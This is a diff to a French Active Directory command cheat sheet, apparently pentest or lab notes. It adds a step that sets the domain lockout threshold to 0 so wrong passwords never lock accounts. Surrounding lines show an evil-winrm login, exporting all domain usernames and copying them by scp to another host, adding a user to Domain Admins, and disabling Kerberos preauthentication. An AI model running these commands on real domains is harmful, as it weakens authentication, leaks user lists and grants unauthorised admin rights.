@@ -380,6 +380,24 @@ sudo evil-winrm -i 10.0.0.1 -u '<UserName>@<Domain-Name>' -p '<password>'
 
 ![img](img/evil.png)
 
+
+### Voir la password policy
+```powershell
+Get-ADDefaultDomainPasswordPolicy
+```
+* __*-LockoutThreshold :*__ Nombre de tentatives de mdp avant que le compye soit vérouillé
+
+* __*-LockoutObservationWindow :*__ durée pendant laquelle les échecs de connexion sont comptabilisés avant remise à zéro du compteur.
+
+* __*-LockoutDuration :*__ durée pendant laquelle le compte reste verrouillé après avoir atteint le seuil de verrouillage.
+
+### Ne jamais bloquer le compte avec des faux mots de passe
+```powershell
+Set-ADDefaultDomainPasswordPolicy -LockoutThreshold 0
+```
+
+---
+
 ### Extraire une liste d'utilisateurs de l'AD
 ```powershell
 Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -Encoding UTF8 C:\Users\Administrateur\Desktop\domusers.txt
@@ -388,6 +406,8 @@ Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -
 ```sh
 scp C:\Users\Administrateur\Desktop\domusers.txt totol@10.0.0.51:/home/toto/Bureau/
 ```
+
+---
 
 ### Afficher les groupes contenant la string "admin"
 ```powershell
@@ -398,6 +418,8 @@ Get-ADGroup -Filter 'Name -like "admin*"' | Select name
 ```powershell
 Add-ADGroupMember -Identity "Admins du domaine" -Members "EDDIE_ROACH"
 ```
+
+---
 
 ### Ajouter du flag DONT_REQ_PREAUTH dans l'attribut userAccountControl (désactive la préauth kerberos)
 ```powershell
